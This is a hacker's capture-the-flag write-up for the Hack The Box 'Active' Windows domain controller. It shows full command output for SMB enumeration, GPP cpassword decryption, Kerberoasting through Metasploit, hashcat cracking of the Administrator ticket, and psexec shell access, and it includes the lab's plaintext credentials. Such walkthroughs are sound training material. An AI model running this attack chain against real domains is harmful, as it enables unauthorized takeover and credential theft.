# Active (Guided mode)

### Difficulty: Easy

### OS: Windows

---

### Enumeration.

I start with nmap as usual, but the first question I have is:

**How many SMB shares are shared by the target?**

To answer this I will check nmap:

```bash
m0j0@r1s1n  ~/HTB/write-ups/active   m0j0_development  nmap -sC -sV -p- 10.10.10.100                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 23:59 GMT
Nmap scan report for 10.10.10.100
Host is up (0.023s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-24 00:04:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msdfsr?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49165/tcp open  unknown
49170/tcp open  unknown
49171/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

This doesn’t give me much to go on for the answer to the question so I need to enumerate the smb shares another way.**SMBMap** is great for this:

```bash
m0j0@r1s1n  ~/HTB/write-ups/active   m0j0_development  smbmap -H 10.10.10.100

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.100:445        Name: 10.10.10.100              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

I count 7 and it is correct. 

Being guided I am presented with the second question:

“What is the name of the share that allows anonymous read access?”

Replication say READ ONLY.
Enumerating this share I eventually came across a file groups.xml:

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 21:46:06 2018

                5217023 blocks of size 4096. 279114 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
```

```bash
m0j0@r1s1n  ~/HTB/write-ups/active   m0j0_development  cat Groups.xml         
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

It looks like some password, oh wait the next question:

“Which file has encrypted account credentials in it?” - Groups.xml

I have the answer but how is it encrypted. I take it to a hashid and it can’t work out what it is so need to think how is this encrypted??
So on Windows machines the OS uses GPP (Group Policy Password) and Kali has a tool I can download [https://www.kali.org/tools/gpp-decrypt/](https://www.kali.org/tools/gpp-decrypt/) gpp-decrypt. And ir]t does a fine job:

```bash
m0j0@r1s1n  ~/HTB/write-ups/active   m0j0_development  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

I got a password now where to use it?  Well it is for the user SVC_TGS so maybe keep with the SMB theme and try to login to a share. I can log in and I proceed to get user.txt.  I prefer a shell but it hasn’t happened.

### Privilege Escalation:

I didn’t nee to think much about what to attempt first and that was getting a golden ticket. so I used a way I don’t always want to - Metasploit but hey it’s 0400am and I ain’t slept.

```bash
msf6 auxiliary(gather/get_user_spns) > show options 

Module options (auxiliary/gather/get_user_spns):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)
   domain                    yes       The target Active Directory domain
   pass                      yes       Password for the domain user account
   user                      yes       Username for a domain account

View the full module info with the info, or info -d command.

msf6 auxiliary(gather/get_user_spns) > set RHOSTS 10.10.10.100
RHOSTS => 10.10.10.100
msf6 auxiliary(gather/get_user_spns) > set domain active.htb
domain => active.htb
msf6 auxiliary(gather/get_user_spns) > set user SVC_TGS
user => SVC_TGS
msf6 auxiliary(gather/get_user_spns) > set pass GPPstillStandingStrong2k18
pass => GPPstillStandingStrong2k18
msf6 auxiliary(gather/get_user_spns) > exploit

[*] Running for 10.10.10.100...
[+] ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
[+] --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
[+] active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-01-23 23:53:10.370542             
[+] $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$46791942fc2f7e13d081568e75919f27$1fbbe307c2fb53d295f30fb16756ea94ca1047b6b9bb45e9331af523015a2d57fec7a5606b05c873baebf147ef297d4a9a184a36f5995ae9a7400a2319cc2b354bb379c4270cc27c69eff7b704df51e259f5a3e06ad8a42dbab9878ee2be119bf5c579268259cfd5331cc288432b1ef9c134ca21c6ee04a91ed8dd144d4edfe8aec8cbf5035d5fa3d8ccd30ebafc687299383272c95da353514df4b75842b04220e457de0a59f4f9e8d4a76ce4f7b3d8f7b644dc3ecf75ac48af5e32c6e64e3bc3f535bb30900d9edcacca7b641f4eed2ec802d8f71d3966e0401dceaf30c9419efbb8bb6868f40998eac73473b7c012bbef91b35a2b6afef9dc217e2b3fecbd41ababbfcfae676f27c68c2c7db601074dd9dee4021f4f25537c091eff28f9abde42cf682757d7b3673a578dbcb4e2fcc6daca16257dc7a4d48afaac813e5f32c71ee31f2f5f2592571606449f9a83573f1ba61353b51d47657c7ac98ed6a6df7e9dfb266300cbfb3884033bbcbb582211e47797e5fd75d60c0e52b2e7b7569609256cedfb90ae0de8cc9a1fd7127775cc5bfddfdb5c35f9df9153c3d5fcf26b5743796f7a82be81f055da14754eb7d0939e0c08eb10eeddfcd4f0726277fe1477e83b6ea73cdf3791ee4eabc1664a1ca006777468eb76736b20a05caa6be3c60d9f46def098bed01260e730906f42c0cd4fa523762e703f921af7530d72a55dadf23ad219c6e3aa7deaad514e0811ba710af13af1b1f7cfa2237b5160d8e8d0859469f8ca1ddee21e8a89bb4c89e68d834d519a5540c084c940e01ae76856cbdc719fc4afb4e2a60c42c83f343ded5d5071ee8a8e21b7a24d995d5ea51903a6a62161a555dcf36292aaef267e66144ec73626c0cb14aaff95026480c63aee617d7f11136c987450a5427ffb02428a6f008507f3677dec7c1881b11d97dc49e74ae7e155ddbf92e9f5ffccc14cc71eb4eef061f608e15b6e57a71cdd1182b4456a8cf1d598630df02ee895b9d6e86bbf379e07475f74bc6b1a3cfe6b4c65c9a1a3ff9c9867d19bfab639d0a2bb8f4edb962a9b9789f1446dca8b5448ec61c652f97ce9e43735cd7a227ce31047ce671e48a0bf7af35fe92574d4cceff3cabe3b6f869f7d5e9e042219d16bc0f3c30a01e76b32b71d15fea5a91c28a3ba5b23810f28acafc3aa5c7ec2bb7b1cc882ffcf4885ff3b48f81cb527973a4e5c5dbeb9d4e56407578cdfdb1b362136901876100a35a006924865464235
```

Wow it’s the Administrators ticket, let’s see if HashCat can do anything, first I head to the Hashcat wiki to find the mode of attack by searching for the start of the ticket `$krb5tgs$23$` this tells me it is:

| 13100 | Kerberos 5, etype 23, TGS-REP |
| --- | --- |

So let’s get HashCat to work:

```bash
m0j0@r1s1n  ~/HTB/write-ups/active   m0j0_development  hashcat -a 0 -m 13100 admin.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 5 7640HS w/ Radeon 760M Graphics, 6921/13906 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$46791942fc2f7e13d081568e75919f27$1fbbe307c2fb53d295f30fb16756ea94ca1047b6b9bb45e9331af523015a2d57fec7a5606b05c873baebf147ef297d4a9a184a36f5995ae9a7400a2319cc2b354bb379c4270cc27c69eff7b704df51e259f5a3e06ad8a42dbab9878ee2be119bf5c579268259cfd5331cc288432b1ef9c134ca21c6ee04a91ed8dd144d4edfe8aec8cbf5035d5fa3d8ccd30ebafc687299383272c95da353514df4b75842b04220e457de0a59f4f9e8d4a76ce4f7b3d8f7b644dc3ecf75ac48af5e32c6e64e3bc3f535bb30900d9edcacca7b641f4eed2ec802d8f71d3966e0401dceaf30c9419efbb8bb6868f40998eac73473b7c012bbef91b35a2b6afef9dc217e2b3fecbd41ababbfcfae676f27c68c2c7db601074dd9dee4021f4f25537c091eff28f9abde42cf682757d7b3673a578dbcb4e2fcc6daca16257dc7a4d48afaac813e5f32c71ee31f2f5f2592571606449f9a83573f1ba61353b51d47657c7ac98ed6a6df7e9dfb266300cbfb3884033bbcbb582211e47797e5fd75d60c0e52b2e7b7569609256cedfb90ae0de8cc9a1fd7127775cc5bfddfdb5c35f9df9153c3d5fcf26b5743796f7a82be81f055da14754eb7d0939e0c08eb10eeddfcd4f0726277fe1477e83b6ea73cdf3791ee4eabc1664a1ca006777468eb76736b20a05caa6be3c60d9f46def098bed01260e730906f42c0cd4fa523762e703f921af7530d72a55dadf23ad219c6e3aa7deaad514e0811ba710af13af1b1f7cfa2237b5160d8e8d0859469f8ca1ddee21e8a89bb4c89e68d834d519a5540c084c940e01ae76856cbdc719fc4afb4e2a60c42c83f343ded5d5071ee8a8e21b7a24d995d5ea51903a6a62161a555dcf36292aaef267e66144ec73626c0cb14aaff95026480c63aee617d7f11136c987450a5427ffb02428a6f008507f3677dec7c1881b11d97dc49e74ae7e155ddbf92e9f5ffccc14cc71eb4eef061f608e15b6e57a71cdd1182b4456a8cf1d598630df02ee895b9d6e86bbf379e07475f74bc6b1a3cfe6b4c65c9a1a3ff9c9867d19bfab639d0a2bb8f4edb962a9b9789f1446dca8b5448ec61c652f97ce9e43735cd7a227ce31047ce671e48a0bf7af35fe92574d4cceff3cabe3b6f869f7d5e9e042219d16bc0f3c30a01e76b32b71d15fea5a91c28a3ba5b23810f28acafc3aa5c7ec2bb7b1cc882ffcf4885ff3b48f81cb527973a4e5c5dbeb9d4e56407578cdfdb1b362136901876100a35a006924865464235:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...464235
Time.Started.....: Wed Jan 24 04:37:43 2024 (5 secs)
Time.Estimated...: Wed Jan 24 04:37:48 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2428.0 kH/s (1.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344384 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10534912/14344384 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiona172 -> Teague
Hardware.Mon.#1..: Util: 63%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Wed Jan 24 04:37:18 2024
Stopped: Wed Jan 24 04:37:49 2024

```

I got the Admin pass: `Ticketmaster1968` so time to try and find root.txt but what entry point is it SMB again?

It didn’t work so I downloaded impacket via here at [Kali](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiilMKFoPWDAxWwbEEAHerUDx0QFnoECBsQAQ&url=https%3A%2F%2Fwww.kali.org%2Ftools%2Fimpacket%2F&usg=AOvVaw3SLZSUNMoXmdO1MO7LsKBR&opi=89978449). I also downloaded the GitHub https://github.com/fortra/impacketthis will go in my toolbox.

So looking at the service and previous Windows boxes, as I have credentials I will try `psexec` to see if I get Administrator shell:

```bash
 ✘ m0j0@r1s1n  ~/tools/impacket/examples   master  impacket-psexec Administrator@active.htb
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file EIgugyXI.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service PnKs on active.htb.....
[*] Starting service PnKs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 
```

And I am Admin and machine pwned (:

### Afterthoughts:

Looking back I started well and began answering the questions but once I got onto Privilege Escalation I didn’t fill the answers in.  I did get all the answers and if you are reading this you will also.

This is a great Windows box that certainly helped me think in a more Windows environment and remember tools I used.  Fun and worth a go.

Peace - m0j0